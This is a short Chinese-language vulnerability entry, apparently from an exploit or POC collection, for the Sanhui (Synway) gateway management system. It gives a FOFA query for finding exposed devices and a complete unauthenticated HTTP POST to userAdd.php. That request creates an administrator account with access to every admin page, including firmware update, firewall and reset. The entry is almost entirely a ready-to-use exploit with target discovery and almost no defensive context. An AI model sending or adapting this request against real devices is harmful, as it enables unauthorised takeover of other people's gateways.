## 三汇网关管理系统 8-1-1userAdd 任意用户创建漏洞

## 漏洞描述
三汇网关管理系统 `8-1-1userAdd` 接口缺乏鉴权，攻击者可直接创建管理员账号，接管系统后台。

## 网络空间测绘
```
fofa: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
```

## POC
```
POST /en/8-1/userAdd.php HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1428

user_name=hack&user_token=&user_password=aklsd11231kkk!&user_authorization=1&page%5B%5D=1-1sysinfo&page%5B%5D=1-4chstatus&page%5B%5D=1-3callcount&page%5B%5D=1-6sipmscount&page%5B%5D=1-5guideset&page%5B%5D=2-1sipset&page%5B%5D=2-3sipcompatibility&page%5B%5D=2-4natset&page%5B%5D=2-2mediaset&page%5B%5D=3-1-1FXSet&page%5B%5D=3-8tone&page%5B%5D=3-12callsound&page%5B%5D=3-10dtmf&page%5B%5D=3-9ringnum&page%5B%5D=3-2faxpara&page%5B%5D=3-3funkey&page%5B%5D=3-4dialrules&page%5B%5D=3-5dialtimeout&page%5B%5D=3-7tip&page%5B%5D=3-11ringback&page%5B%5D=3-8gos&page%5B%5D=3-14actionurl&page%5B%5D=3-17ModuleArea&page%5B%5D=3-16vpnset&page%5B%5D=8-1user&page%5B%5D=4-1fxsset&page%5B%5D=4-1fxsadvance&page%5B%5D=4-2groupportset&page%5B%5D=5-4RouteParameter&page%5B%5D=5-1routerrules&page%5B%5D=5-2routerrulesTel2IP&page%5B%5D=7-4manipulateSrcTel2IP&page%5B%5D=7-2manipulateDstIP2Tel&page%5B%5D=7-3configfile&page%5B%5D=6-1netset&page%5B%5D=6-3softupdated&page%5B%5D=6-15pcap&page%5B%5D=6-17calllog&page%5B%5D=6-19operatelog&page%5B%5D=6-6backup&page%5B%5D=6-7reset&page%5B%5D=6-13systemmonitor&page%5B%5D=6-22certificates&page%5B%5D=6-23configoptimize&page%5B%5D=6-10snmp&page%5B%5D=6-10tr069&page%5B%5D=6-20iptables&page%5B%5D=6-11ping&page%5B%5D=6-22DNSTest&page%5B%5D=6-12trace&page%5B%5D=6-5modifypwd&page%5B%5D=6-8boot&save=Save
```

## 参考
- 社区情报

